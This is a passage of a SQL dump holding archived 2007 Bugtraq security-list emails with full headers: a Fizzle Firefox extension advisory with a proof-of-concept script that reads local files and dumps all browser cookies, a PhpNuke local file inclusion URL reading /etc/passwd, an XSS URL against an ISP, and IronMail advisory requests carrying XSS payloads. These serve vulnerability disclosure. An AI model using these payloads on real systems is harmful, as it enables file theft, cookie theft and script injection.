you clear the Fizzle cache in\nthe fizzle folder under the Firefox profile.\n\nAn attacker can check if a feed subscriber has Fizzle because Fizzle''s HTTP\nrequest sends a custom user-agent which has the word ''Fizzle'' in it.\nDetecting that keyword an attacker can serve a malicious copy of the feed\ninstead.\n\n- -------------------------------------------------------------------------\nPOC: Local File Reading and Cookie Reading (The HTML entities MUST be used)\n- -------------------------------------------------------------------------\n&lt;script&gt;\n\nfunction read(readfile)\n{\n    var file = Components.classes[&quot;@mozilla.org/file/local;1&quot;]\n             .createInstance(Components.interfaces.nsILocalFile);\n    file.initWithPath(readfile);\n    var is =\nComponents.classes[&quot;@mozilla.org/network/file-input-stream;1&quot;]\n           .createInstance(Components.interfaces.nsIFileInputStream);\n    is.init(file, 0x01, 00004, null);\n    var sis =\nComponents.classes[&quot;@mozilla.org/scriptableinputstream;1&quot;]\n            .createInstance(Components.interfaces.nsIScriptableInputStream);\n    sis.init(is);\n    var output = sis.read(sis.available());\n    alert(output);\n}\nread(&quot;C:\\test.txt&quot;);\n\nfunction getCookies()\n{\n    var cookieManager =\nComponents.classes[&quot;@mozilla.org/cookiemanager;1&quot;]\n                      .getService(Components.interfaces.nsICookieManager);\n    var str = '''';\n    var iter = cookieManager.enumerator;\n    while (iter.hasMoreElements())\n    {\n        var cookie = iter.getNext();\n        if (cookie instanceof Components.interfaces.nsICookie)\n        {\n            str += &quot;Host: &quot; + cookie.host\n                 + &quot;\\nName: &quot; + cookie.name\n                 + &quot;\\nValue: &quot; + cookie.value\n                 + &quot;\\n\\n&quot;;\n        }\n    }\n    alert(str);\n}\ngetCookies()\n\n&lt;/script&gt;\n- -------------------------------------------------------------------------\n\nI apologize for the blank emails before. Outblaze the provider for my other\nemail was for some reason sending the email as blank. So using this account\ninstead\n\nRegards,\nCM.\n\n\n \n____________________________________________________________________________________\nIt''s here! Your new message!  \nGet new email alerts with the free Yahoo! Toolbar.\nhttp://tools.search.yahoo.com/toolbar/features/mail/\n', 'Fizzle : Firefox Extension Vulnerability', 'Fizzle allows feeds to use HTML in feed data resulting in JavaScript being\nrun in the chrome: window with chrome permissions. The extension will\nconvert HTML entities back to their ASCII equivalents thus &lt; becomes <\nand so forth. Various feeds fields are vulnerable including the title which\nallows the code to execute when Fizzle is opened and no need for the feed\nto be viewed.\n\nThe author Andy Frank was notified about the issue on 01/29/2007 we\ncorresponded on the issue and I even offered to create a patch which I did.\nThe patch did not meet his liking since the sanitation was too strict and\nmade some feeds who use certain tags like <p> for formatting to lose their\nlayout I told him it would be too difficult to sanitize the data unless its\nstrict because so many attack variations could be used, and best thing to\ndo is not allow HTML at all in the feed. On 02/20/2007 we ended discussions\non this and I notified addons.mozilla.org about the problem and the\ndevelopers lack of concern in fixing the extension or at least disabling\nits download so people would not download the extension. Well Mozilla\ndidn''t bother to remove it and have chosen to remove the extension in a\nfuture date when addons.mozilla.org is updated. Since then over 2,000+\nusers have additionally downloaded the extension, invoking me to go\nfull-disclosure about it.\nFizzle 0.5 (previous versions likely vulnerable as well)\nhttps://addons.mozilla.org/firefox/1307/\n\nBelow is the example I have tested out using version 0.5 and under nightly\nFirefox. Please note that the HTML entities must be present for the exploit\nto work. Place the below in your feed body and subscribe to the feed. View\nthe feed in Fizzle. When testing make sure you clear the Fizzle cache in\nthe fizzle folder under the Firefox profile.\n\nAn attacker can check if a feed subscriber has Fizzle because Fizzle''s HTTP\nrequest sends a custom user-agent which has the word ''Fizzle'' in it.\nDetecting that keyword an attacker can serve a malicious copy of the feed\ninstead.\n\n- -------------------------------------------------------------------------\nPOC: Local File Reading and Cookie Reading (The HTML entities MUST be used)\n- -------------------------------------------------------------------------\n&lt;script&gt;\n\nfunction read(readfile)\n{\n    var file = Components.classes[&quot;@mozilla.org/file/local;1&quot;]\n             .createInstance(Components.interfaces.nsILocalFile);\n    file.initWithPath(readfile);\n    var is =\nComponents.classes[&quot;@mozilla.org/network/file-input-stream;1&quot;]\n           .createInstance(Components.interfaces.nsIFileInputStream);\n    is.init(file, 0x01, 00004, null);\n    var sis =\nComponents.classes[&quot;@mozilla.org/scriptableinputstream;1&quot;]\n            .createInstance(Components.interfaces.nsIScriptableInputStream);\n    sis.init(is);\n    var output = sis.read(sis.available());\n    alert(output);\n}\nread(&quot;C:\\test.txt&quot;);\n\nfunction getCookies()\n{\n    var cookieManager =\nComponents.classes[&quot;@mozilla.org/cookiemanager;1&quot;]\n                      .getService(Components.interfaces.nsICookieManager);\n    var str = '''';\n    var iter = cookieManager.enumerator;\n    while (iter.hasMoreElements())\n    {\n        var cookie = iter.getNext();\n        if (cookie instanceof Components.interfaces.nsICookie)\n        {\n            str += &quot;Host: &quot; + cookie.host\n                 + &quot;\\nName: &quot; + cookie.name\n                 + &quot;\\nValue: &quot; + cookie.value\n                 + &quot;\\n\\n&quot;;\n        }\n    }\n    alert(str);\n}\ngetCookies()\n\n&lt;/script&gt;\n- -------------------------------------------------------------------------\n\nI apologize for the blank emails before. Outblaze the provider for my other\nemail was for some reason sending the email as blank. So using this account\ninstead\n\nRegards,\nCM.\n\n\n \n____________________________________________________________________________________\nIt''s here! Your new message!  \nGet new email alerts with the free Yahoo! Toolbar.\nhttp://tools.search.yahoo.com/toolbar/features/mail/\n', 1, 1, 0),
(5, 'Return-Path: <bugtraq-return-31216-bugtraq2=digitalslack.com@securityfocus.com>\nX-Original-To: bugtraq2@digitalslack.com\nDelivered-To: m7283859@spunkymail-mx7.g.dreamhost.com\nReceived: from enforcer.dreamhost.com (sd-green-bigip-145.dreamhost.com [208.97.132.145])\n  by spunkymail-mx7.g.dreamhost.com (Postfix) with ESMTP id AF6A4B647\n   for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 09:26:05 -0700 (PDT)\nReceived: from localhost (localhost [127.0.0.1])\n  by enforcer.dreamhost.com (Postfix) with ESMTP id 19FCE17D056\n for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 09:26:05 -0700 (PDT)\nX-DH-Virus-Scanned: Debian amavisd-new at enforcer.dreamhost.com\nX-Spam-Score: 0.001\nX-Spam-Level: \nX-Spam-Status: No, score=0.001 tagged_above=-999 required=999\n  tests=[UNPARSEABLE_RELAY=0.001]\nReceived: from enforcer.dreamhost.com ([127.0.0.1])\n  by localhost (enforcer.dreamhost.com [127.0.0.1]) (amavisd-new, port 10024)\n   with ESMTP id ZY9Po+uYSA6h for <bugtraq2@digitalslack.com>;\n   Mon, 26 Mar 2007 09:26:04 -0700 (PDT)\nReceived: from outgoing.securityfocus.com (outgoing.securityfocus.com [205.206.231.26])\n    by enforcer.dreamhost.com (Postfix) with ESMTP id B1ACB17D03C\n for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 09:26:03 -0700 (PDT)\nReceived: from outgoing.securityfocus.com by outgoing.securityfocus.com\n          via smtpd (for fltr-in2.mail.dreamhost.com [208.97.132.72]) with ESMTP; Mon, 26 Mar 2007 08:19:42 -0800\nReceived: from lists2.securityfocus.com (lists2.securityfocus.com [205.206.231.20])\n   by outgoing2.securityfocus.com (Postfix) with QMQP\n    id 3438B143BAE; Mon, 26 Mar 2007 10:16:14 -0700 (MST)\nMailing-List: contact bugtraq-help@securityfocus.com; run by ezmlm\nPrecedence: bulk\nList-Id: <bugtraq.list-id.securityfocus.com>\nList-Post: <mailto:bugtraq@securityfocus.com>\nList-Help: <mailto:bugtraq-help@securityfocus.com>\nList-Unsubscribe: <mailto:bugtraq-unsubscribe@securityfocus.com>\nList-Subscribe: <mailto:bugtraq-subscribe@securityfocus.com>\nDelivered-To: mailing list bugtraq@securityfocus.com\nDelivered-To: moderator for bugtraq@securityfocus.com\nReceived: (qmail 12982 invoked from network); 26 Mar 2007 14:52:49 -0000\nDate: 26 Mar 2007 14:54:04 -0000\nMessage-ID: <20070326145404.4863.qmail@securityfocus.com>\nContent-Type: text/plain\nContent-Disposition: inline\nContent-Transfer-Encoding: binary\nMIME-Version: 1.0\nX-Mailer: MIME-tools 5.411 (Entity 5.404)\nFrom: stormhacker@hotmail.com\nTo: bugtraq@securityfocus.com\nSubject: Satel Lite for PhpNuke (Satellite.php) <= Local File Inclusion\n\n+--------------------------------------------------------------------\n+\n+ Satel Lite for PhpNuke (Satellite.php) <= Local File Inclusion\n+\n+--------------------------------------------------------------------\n+\n+ Affected Software .: NUke Satel lite\n+ Class .............: LoCal File Inclusion\n+ Risk ..............: high (LoCal File Execution)\n+ Found by ..........: rUnViRuS\n+ Original advisory .: http://www.sec-area.com/ http://www.worlddefacers.de/\n+ Contact ...........: stormhacker[at]hotmail[.]com\n+\n+--------------------------------------------------------------------\n+ PoC:\n+\n+http://www.example.com/nuke_path/Satellite.php?op=modload&name=../../../../../../etc/passwd&file=index\n+\n+\n+--------------------------------------------------------------------\n+ [W]orld [D]efacers [T]eam\n+ Greets:\n+ || rUnViRuS || - || papipsycho || - || HeX || - || Linux Master || BlackWHITE ||\n+ || Pro Hacker || - || DARKFIRE ||\n+\n+-------------------------[ W D T ]----------------------------------\n', 'Satel Lite for PhpNuke (Satellite.php) <= Local File Inclusion', '+--------------------------------------------------------------------\n+\n+ Satel Lite for PhpNuke (Satellite.php) <= Local File Inclusion\n+\n+--------------------------------------------------------------------\n+\n+ Affected Software .: NUke Satel lite\n+ Class .............: LoCal File Inclusion\n+ Risk ..............: high (LoCal File Execution)\n+ Found by ..........: rUnViRuS\n+ Original advisory .: http://www.sec-area.com/ http://www.worlddefacers.de/\n+ Contact ...........: stormhacker[at]hotmail[.]com\n+\n+--------------------------------------------------------------------\n+ PoC:\n+\n+http://www.example.com/nuke_path/Satellite.php?op=modload&name=../../../../../../etc/passwd&file=index\n+\n+\n+--------------------------------------------------------------------\n+ [W]orld [D]efacers [T]eam\n+ Greets:\n+ || rUnViRuS || - || papipsycho || - || HeX || - || Linux Master || BlackWHITE ||\n+ || Pro Hacker || - || DARKFIRE ||\n+\n+-------------------------[ W D T ]----------------------------------\n', 1, 1, 0),
(6, 'Return-Path: <bugtraq-return-31208-bugtraq2=digitalslack.com@securityfocus.com>\nX-Original-To: bugtraq2@digitalslack.com\nDelivered-To: m7283859@spunkymail-mx3.g.dreamhost.com\nReceived: from montecristo.dreamhost.com (sd-green-bigip-207.dreamhost.com [208.97.132.207])\n   by spunkymail-mx3.g.dreamhost.com (Postfix) with ESMTP id A29A38DD19\n  for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 09:46:50 -0700 (PDT)\nReceived: from localhost (localhost [127.0.0.1])\n  by montecristo.dreamhost.com (Postfix) with ESMTP id 4870D89265\n   for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 09:46:50 -0700 (PDT)\nX-DH-Virus-Scanned: Debian amavisd-new at montecristo.dreamhost.com\nX-Spam-Score: 0.001\nX-Spam-Level: \nX-Spam-Status: No, score=0.001 tagged_above=-999 required=999\n   tests=[UNPARSEABLE_RELAY=0.001]\nReceived: from montecristo.dreamhost.com ([127.0.0.1])\n   by localhost (montecristo.dreamhost.com [127.0.0.1]) (amavisd-new, port 10024)\n    with ESMTP id m3yxWWccvp7d for <bugtraq2@digitalslack.com>;\n   Mon, 26 Mar 2007 09:46:49 -0700 (PDT)\nReceived: from outgoing.securityfocus.com (outgoing.securityfocus.com [205.206.231.27])\n    by montecristo.dreamhost.com (Postfix) with ESMTP id CA6CF8981A\n   for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 09:41:47 -0700 (PDT)\nReceived: from outgoing.securityfocus.com by outgoing.securityfocus.com\n          via smtpd (for fltr-in4.mail.dreamhost.com [208.97.132.73]) with ESMTP; Mon, 26 Mar 2007 08:35:26 -0800\nReceived: from lists2.securityfocus.com (lists2.securityfocus.com [205.206.231.20])\n   by outgoing3.securityfocus.com (Postfix) with QMQP\n    id 06ED6246CB7; Mon, 26 Mar 2007 09:51:36 -0700 (MST)\nMailing-List: contact bugtraq-help@securityfocus.com; run by ezmlm\nPrecedence: bulk\nList-Id: <bugtraq.list-id.securityfocus.com>\nList-Post: <mailto:bugtraq@securityfocus.com>\nList-Help: <mailto:bugtraq-help@securityfocus.com>\nList-Unsubscribe: <mailto:bugtraq-unsubscribe@securityfocus.com>\nList-Subscribe: <mailto:bugtraq-subscribe@securityfocus.com>\nDelivered-To: mailing list bugtraq@securityfocus.com\nDelivered-To: moderator for bugtraq@securityfocus.com\nReceived: (qmail 19481 invoked from network); 25 Mar 2007 11:06:14 -0000\nMessage-ID: <46064A2E.5090006@fback.net>\nDate: Sun, 25 Mar 2007 12:08:46 +0200\nFrom: =?ISO-8859-2?Q?Bart=B3omiej_Ochman?= <fback@fback.net>\nUser-Agent: Thunderbird 1.5.0.10 (X11/20070306)\nMIME-Version: 1.0\nTo: bugtraq@securityfocus.com\nSubject: Re: Linksys WAG200G - Information disclosure\nReferences: <20070320203101.5201.qmail@securityfocus.com>\nIn-Reply-To: <20070320203101.5201.qmail@securityfocus.com>\nContent-Type: text/plain; charset=ISO-8859-2\nContent-Transfer-Encoding: 7bit\n\ndniggebrugge@hotmail.com wrote:\n> Hi there,\n> \n> About 2 months ago I bought a wireless ADSL modem/router, the Linksys WAG200G. Just did some basic security\n> checks and to my utter surprise the device responded with about all sensitive information it knows:\n[...]\n> My firmware version is 1.01.01, latest available for this type.\nIt works the same with WRT54GC v2 with (latest) firmware 1.00.7.\n\nRegards,\nBO\n\n', 'Re: Linksys WAG200G - Information disclosure', 'dniggebrugge@hotmail.com wrote:\n> Hi there,\n> \n> About 2 months ago I bought a wireless ADSL modem/router, the Linksys WAG200G. Just did some basic security\n> checks and to my utter surprise the device responded with about all sensitive information it knows:\n[...]\n> My firmware version is 1.01.01, latest available for this type.\nIt works the same with WRT54GC v2 with (latest) firmware 1.00.7.\n\nRegards,\nBO\n\n', 1, 1, 0),
(7, 'Return-Path: <bugtraq-return-31209-bugtraq2=digitalslack.com@securityfocus.com>\nX-Original-To: bugtraq2@digitalslack.com\nDelivered-To: m7283859@spunkymail-mx2.g.dreamhost.com\nReceived: from terminator.dreamhost.com (sd-green-bigip-66.dreamhost.com [208.97.132.66])\n  by spunkymail-mx2.g.dreamhost.com (Postfix) with ESMTP id 41502718D8\n  for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 09:58:26 -0700 (PDT)\nReceived: from localhost (localhost [127.0.0.1])\n  by terminator.dreamhost.com (Postfix) with ESMTP id 2AB7AB8699\n    for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 09:58:24 -0700 (PDT)\nX-DH-Virus-Scanned: Debian amavisd-new at terminator.dreamhost.com\nX-Spam-Score: -2.311\nX-Spam-Level: \nX-Spam-Status: No, score=-2.311 tagged_above=-999 required=999\n  tests=[BAYES_00=-2.312, UNPARSEABLE_RELAY=0.001]\nReceived: from terminator.dreamhost.com ([127.0.0.1])\n   by localhost (terminator.dreamhost.com [127.0.0.1]) (amavisd-new, port 10024)\n with ESMTP id mzsXKXj8Y+aR for <bugtraq2@digitalslack.com>;\n   Mon, 26 Mar 2007 09:58:23 -0700 (PDT)\nReceived: from outgoing.securityfocus.com (outgoing.securityfocus.com [205.206.231.27])\n    by terminator.dreamhost.com (Postfix) with ESMTP id ACD86B8684\n    for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 09:58:23 -0700 (PDT)\nReceived: from outgoing.securityfocus.com by outgoing.securityfocus.com\n          via smtpd (for fltr-in2.mail.dreamhost.com [208.97.132.72]) with ESMTP; Mon, 26 Mar 2007 08:57:14 -0800\nReceived: from lists2.securityfocus.com (lists2.securityfocus.com [205.206.231.20])\n   by outgoing3.securityfocus.com (Postfix) with QMQP\n    id EC93B23A973; Mon, 26 Mar 2007 09:51:52 -0700 (MST)\nMailing-List: contact bugtraq-help@securityfocus.com; run by ezmlm\nPrecedence: bulk\nList-Id: <bugtraq.list-id.securityfocus.com>\nList-Post: <mailto:bugtraq@securityfocus.com>\nList-Help: <mailto:bugtraq-help@securityfocus.com>\nList-Unsubscribe: <mailto:bugtraq-unsubscribe@securityfocus.com>\nList-Subscribe: <mailto:bugtraq-subscribe@securityfocus.com>\nDelivered-To: mailing list bugtraq@securityfocus.com\nDelivered-To: moderator for bugtraq@securityfocus.com\nReceived: (qmail 14912 invoked from network); 25 Mar 2007 09:18:39 -0000\nMessage-ID: <005c01c76eb6$64674060$0600a8c0@hpa>\nFrom: "Nikolay Kichukov" <hijacker@oldum.net>\nTo: "Florian Stinglmayr" <fstinglmayr@gmail.com>,\n   <bugtraq@securityfocus.com>, <full-disclosure@lists.grok.org.uk>\nReferences: <45F64E0D.1060600@gmail.com>\nSubject: Re: [Full-disclosure] XSS at Aon.at, Austrian ISP\nDate: Sun, 25 Mar 2007 11:20:04 +0300\nOrganization: Oldum Networks\nMIME-Version: 1.0\nContent-Type: text/plain;\n charset="iso-8859-1"\nContent-Transfer-Encoding: 7bit\nX-Priority: 3\nX-MSMail-Priority: Normal\nX-Mailer: Microsoft Outlook Express 6.00.2800.1807\nX-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1896\n\nseems already fixed ... good job.\n\n-Nikolay Kichukov\n\n----- Original Message ----- \nFrom: "Florian Stinglmayr" <fstinglmayr@gmail.com>\nTo: <bugtraq@securityfocus.com>; <full-disclosure@lists.grok.org.uk>\nSent: Tuesday, March 13, 2007 10:09 AM\nSubject: [Full-disclosure] XSS at Aon.at, Austrian ISP\n\n\n> Here we go:\n> \n> http://jawe.aon.at/search/aon.sp?query=<script>alert(1);</script>\n> \n> The issue has been reported to AON before.\n> \n> Regards,\n> Florian Stinglmayr\n> \n> _______________________________________________\n> Full-Disclosure - We believe in it.\n> Charter: http://lists.grok.org.uk/full-disclosure-charter.html\n> Hosted and sponsored by Secunia - http://secunia.com/\n> \n', 'Re: [Full-disclosure] XSS at Aon.at, Austrian ISP', 'seems already fixed ... good job.\n\n-Nikolay Kichukov\n\n----- Original Message ----- \nFrom: "Florian Stinglmayr" <fstinglmayr@gmail.com>\nTo: <bugtraq@securityfocus.com>; <full-disclosure@lists.grok.org.uk>\nSent: Tuesday, March 13, 2007 10:09 AM\nSubject: [Full-disclosure] XSS at Aon.at, Austrian ISP\n\n\n> Here we go:\n> \n> http://jawe.aon.at/search/aon.sp?query=<script>alert(1);</script>\n> \n> The issue has been reported to AON before.\n> \n> Regards,\n> Florian Stinglmayr\n> \n> _______________________________________________\n> Full-Disclosure - We believe in it.\n> Charter: http://lists.grok.org.uk/full-disclosure-charter.html\n> Hosted and sponsored by Secunia - http://secunia.com/\n> \n', 1, 1, 0);
INSERT IGNORE INTO `message` (`id`, `text`, `subject`, `body`, `message_type_id`, `source_id`, `processed`) VALUES (8, 'Return-Path: <bugtraq-return-31215-bugtraq2=digitalslack.com@securityfocus.com>\nX-Original-To: bugtraq2@digitalslack.com\nDelivered-To: m7283859@spunkymail-mx7.g.dreamhost.com\nReceived: from montecristo.dreamhost.com (sd-green-bigip-145.dreamhost.com [208.97.132.145])\n    by spunkymail-mx7.g.dreamhost.com (Postfix) with ESMTP id E6F41B588\n   for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 10:09:57 -0700 (PDT)\nReceived: from localhost (localhost [127.0.0.1])\n  by montecristo.dreamhost.com (Postfix) with ESMTP id C99F1896A0\n   for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 10:09:56 -0700 (PDT)\nX-DH-Virus-Scanned: Debian amavisd-new at montecristo.dreamhost.com\nX-Spam-Score: 1.668\nX-Spam-Level: *\nX-Spam-Status: No, score=1.668 tagged_above=-999 required=999\n  tests=[NORMAL_HTTP_TO_IP=0.001, SARE_URI_EQUALS=1.666,\n    UNPARSEABLE_RELAY=0.001]\nReceived: from montecristo.dreamhost.com ([127.0.0.1])\n  by localhost (montecristo.dreamhost.com [127.0.0.1]) (amavisd-new, port 10024)\n    with ESMTP id L8BD0AoLF1i3 for <bugtraq2@digitalslack.com>;\n   Mon, 26 Mar 2007 10:09:03 -0700 (PDT)\nReceived: from outgoing.securityfocus.com (outgoing.securityfocus.com [205.206.231.26])\n    by montecristo.dreamhost.com (Postfix) with ESMTP id 1FF7489AD9\n   for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 10:02:30 -0700 (PDT)\nReceived: from outgoing.securityfocus.com by outgoing.securityfocus.com\n          via smtpd (for fltr-in2.mail.dreamhost.com [208.97.132.72]) with ESMTP; Mon, 26 Mar 2007 09:01:18 -0800\nReceived: from lists2.securityfocus.com (lists2.securityfocus.com [205.206.231.20])\n   by outgoing2.securityfocus.com (Postfix) with QMQP\n    id 0C0E9143840; Mon, 26 Mar 2007 10:12:32 -0700 (MST)\nMailing-List: contact bugtraq-help@securityfocus.com; run by ezmlm\nPrecedence: bulk\nList-Id: <bugtraq.list-id.securityfocus.com>\nList-Post: <mailto:bugtraq@securityfocus.com>\nList-Help: <mailto:bugtraq-help@securityfocus.com>\nList-Unsubscribe: <mailto:bugtraq-unsubscribe@securityfocus.com>\nList-Subscribe: <mailto:bugtraq-subscribe@securityfocus.com>\nDelivered-To: mailing list bugtraq@securityfocus.com\nDelivered-To: moderator for bugtraq@securityfocus.com\nReceived: (qmail 383 invoked from network); 26 Mar 2007 10:33:22 -0000\nMessage-ID: <4607910D.6040107@spezialk.net>\nDate: Mon, 26 Mar 2007 11:23:25 +0200\nFrom: Javier Olascoaga <deese@spezialk.net>\nUser-Agent: Thunderbird 1.5.0.10 (Windows/20070221)\nMime-Version: 1.0\nContent-Type: multipart/mixed; boundary="=_gantz-15840-1174901611-0001-2"\nTo: bugtraq@securityfocus.com\nSubject: Multiple XSS in IronMail\n\nThis is a MIME-formatted message.  If you see this text it means that your\nE-mail software does not support MIME-formatted messages.\n\n--=_gantz-15840-1174901611-0001-2\nContent-Type: text/plain; charset=iso-8859-1; format=flowed\nContent-Transfer-Encoding: 7bit\n\nFounded multiple XSS in IronMail.\n\nSee attached advisory. Spanish version in http://www.514.es.\n\nRegards,\n\n- J\n\n--=_gantz-15840-1174901611-0001-2\nContent-Type: text/plain; name="SIAADV-07-004-EN.txt"; charset=iso-8859-1\nContent-Transfer-Encoding: quoted-printable\nContent-Disposition: inline;\n filename="SIAADV-07-004-EN.txt"\n\n          =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=\n=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D\n                   - Advisory -\n          =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=\n=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D\n =20\n  T=EDtulo:   Multipls XSS in Cypherstrust Ironmail 6.1.1\n    Risk:   Medium\n    Date:   20.Feb.2007\n  Author:   Javier Olascoaga <jolascoaga *at* 514.es>     =20\n     WEB:   http://www.514.es/\n\n\n=2E: [ INTRO ] :.\n=09\nIronMail protects enterprise email systems from inbound threats: spam, vi=\nruses;\nor hackers trying to take down or take over the e-mail system. IronMail p=\nrotects\nenterprise email systems from outbound threats: regulatory compliance vio=\nlations\n, corporate policy violations, or theft ("leakage") of confidential infor=\nmation=20\nor intellectual property. IronMail protects enterprise email systems from=\n threats that haven''t even been identified yet.=20\n\n=2E: [ TECHNICAL DESCRIPTION ] :.\n\nDuring the development of the technical tests against the IronMail mail s=\nystem=20\nhave been detected several Cross Site Scripting vulnerabilities in the=20\nadministration console of the product.\n\n\nNext you can find the XSS founded:\n\n=2E: [ XSS #1 ] :.\n\nPOST https://172.0.0.2:10443/admin/systemRouting.do?method=3Dsubmit HTTP/=\n1.1\nReferer:\nhttps://172.0.0.2:10443/admin/systemRouting.do?method=3Dinit&isMenuToggle=\nd=3D1\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 295\nCache-Control: no-cache\nCookie: CTSecureToken=3D53DFBE4753D221B2707050E96902E98D_admin;\nitemToHighlight=3Dhttps%3A//172.0.0.2%3A10443/admin/systemRouting.do%3Fme=\nthod%3Dinit%26isMenuToggled%3D1;\nmenusToExpand=3D%2CConfigurationMenu%2C; tabbedMenuSelected=3D11;\n/admin/queueManager.dofirsttimeload=3D1; /admin/queueManager.do=3D;\nJSESSIONID=3DB227892A258E91419C09469E49AED4D4\n  ''rows%5B0%5D.networkId=3D172.16.0.0&rows%5B0%5D.netmaskId=3D255.255.0.0=\n&rows%5B1%5D.networkId=3D192.168.0.0&rows%5B1%5D.netmaskId=3D255.255.0.0&=\nnetwork=3D%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&netmask=3D=\n128.0.0.0&defRouterIp=3D%27%3E%3Cscript%3Ealert%28%27SIA2%27%29%3C%2Fscri=\npt%3E&submit=3DSubmit\n\n\n=2E: [ XSS #2 ] :.\n\nPOST https://172.0.0.2:10443/admin/system_IronMail.do?method=3DsaveNew HT=\nTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/system_IronMail.do?method=3DgetDetail&isMen=\nuToggled=3D1\nAccept-Language: es-ES,en-us;q=3D0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 343\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=3D2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=3D17;\nitemToHighlight=3Dhttps%3A//172.0.0.2%3A10443/admin/system_IronMail.do%3F=\nmethod%3DgetDetail%26isMenuToggled%3D1;\nmenusToExpand=3D%2CConfigurationMenu%2C;\nJSESSIONID=3D5A6DABFA0209D0BEC17AF6841DEA184E\nWmtu=3D1500&hostName=3D%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript=\n%3E&domainName=3Dsytes.net&ipAddress=3D10.1.1.1&ipNetMask=3D255.255.255.2=\n24&defaultRouter=3D10.1.1.2&dns1=3D10.1.1.3&dns2=3D10.1.1.4&dns3=3D10.1.1=\n=2E5&ntp1=3Dtime.nist.gov&ntp2=3Dbitsy.mit.edu&ntp3=3Dclock.isc.org&timeZ=\none=3DEurope%2FMadrid&ethernetSetting=3Dautoselect&submit=3DSubmit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:11:46 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=3Dutf-8\n\n=2E: [ XSS #3 ] :.\n\nPOST https://172.0.0.2:10443/admin/system_IronMail.do?method=3DsaveNew HT=\nTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer: https://172.0.0.2:10443/admin/system_IronMail.do?method=3DsaveNe=\nw\nAccept-Language: es-ES,en-us;q=3D0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 341\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=3D2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=3D17;\nitemToHighlight=3Dhttps%3A//172.0.0.2%3A10443/admin/system_IronMail.do%3F=\nmethod%3DsaveNew;\nmenusToExpand=3D%2CConfigurationMenu%2C;\nJSESSIONID=3D5A6DABFA0209D0BEC17AF6841DEA184E\nUmtu=3D1500&hostName=3Dmmail11&domainName=3D%27%3E%3Cscript%3Ealert%28%27=\nSIA%27%29%3C%2Fscript%3E&ipAddress=3D10.1.1.1&ipNetMask=3D255.255.255.224=\n&defaultRouter=3D10.1.1.2&dns1=3D10.1.1.3&dns2=3D10.1.1.4&dns3=3D10.1.1.5=\n&ntp1=3Dtime.nist.gov&ntp2=3Dbitsy.mit.edu&ntp3=3Dclock.isc.org&timeZone=3D=\nEurope%2FMadrid&ethernetSetting=3Dautoselect&submit=3DSubmit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:12:26 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=3Dutf-8\n\n=2E: [ XSS #4 ] :.\n\nPOST https://172.0.0.2:10443/admin/system_IronMail.do?method=3DsaveNew HT=\nTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer: https://172.0.0.2:10443/admin/system_IronMail.do?method=3DsaveNe=\nw\nAccept-Language: es-ES,en-us;q=3D0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 337\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: 